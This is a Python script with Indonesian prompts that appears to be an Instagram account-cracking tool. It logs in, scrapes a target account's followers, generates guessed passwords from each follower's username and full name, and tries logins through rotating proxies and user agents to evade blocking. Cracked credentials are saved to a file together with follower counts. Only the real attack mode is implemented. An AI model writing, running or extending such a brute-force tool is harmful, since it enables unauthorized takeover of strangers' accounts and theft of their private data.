import argparse
import json
import random
import os
import time
from colorama import Fore, init
from utils.scraper import scrape_followers
from utils.password_gen import generate_passwords
from utils.tools import login_real, load_list_from_file, get_user_info

init(autoreset=True)

def clear_terminal():
    os.system("cls" if os.name == "nt" else "clear")

def brute_force_real_mode():
    clear_terminal()

    # Login interaktif
    print(Fore.CYAN + "🔐 Login terlebih dahulu")
    username_login = input(Fore.YELLOW + "Username IG login: ").strip()
    password_login = input(Fore.YELLOW + "Password IG login: ").strip()

    # Coba login akun utama (untuk scraping)
    print(Fore.CYAN + "🔄 Mencoba login...")
    success = login_real(username_login, password_login)
    if not success:
        print(Fore.RED + "❌ Login gagal. Username/password salah atau terblokir.")
        return

    print(Fore.GREEN + "✅ Login berhasil.\n")

    input(Fore.YELLOW + "Tekan Enter untuk lanjut... ")
    clear_terminal()

    # Input target
    target_username = input(Fore.YELLOW + "Masukkan username target Instagram: ").strip()
    print(Fore.YELLOW + f"\n🔍 Scraping followers dari: {target_username} ...")

    # Gunakan sesi login ulang untuk scraping followers target
    from instagrapi import Client
    cl = Client()
    cl.login(username_login, password_login)

    followers = scrape_followers(cl, target_username)
    if not followers:
        print(Fore.RED + "❌ Gagal scrape followers atau tidak ada followers.")
        return

    print(Fore.GREEN + f"✅ Total followers ditemukan: {len(followers)}\n")

    proxies = load_list_from_file("Proxy.txt")
    user_agents = load_list_from_file("User-agents.txt")

    berhasil = 0
    total = len(followers)

    for idx, user in enumerate(followers, start=1):
        username = user['username']
        full_name = user.get('full_name', '')
        passwords = generate_passwords(username, full_name)

        print(Fore.CYAN + f"🔄 [{idx}/{total}] Mencoba login: {username} ({len(passwords)} kombinasi)")

        for pwd in passwords:
            proxy = random.choice(proxies) if proxies else None
            ua = random.choice(user_agents) if user_agents else None

            success = login_real(username, pwd, user_agent=ua, proxy=proxy)
            if success:
                info = get_user_info(username)
                hasil = f"{username}|{pwd}|followers:{info['followers']}|following:{info['following']}|posts:{info['posts']}\n"
                print(Fore.GREEN + f"✅ Sukses: {hasil.strip()}")
                with open("hasil_login_berhasil.txt", "a") as f:
                    f.write(hasil)
                berhasil += 1
                break

    print(Fore.YELLOW + f"\n📊 SELESAI: {berhasil} akun berhasil login dari total {total} target.\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", help="Mode: real / simulasi", choices=["real", "simulasi"], default="simulasi")
    args = parser.parse_args()

    if args.mode == "real":
        brute_force_real_mode()
    else:
        clear_terminal()
        print(Fore.YELLOW + "🔧 Mode simulasi belum diimplementasikan.")
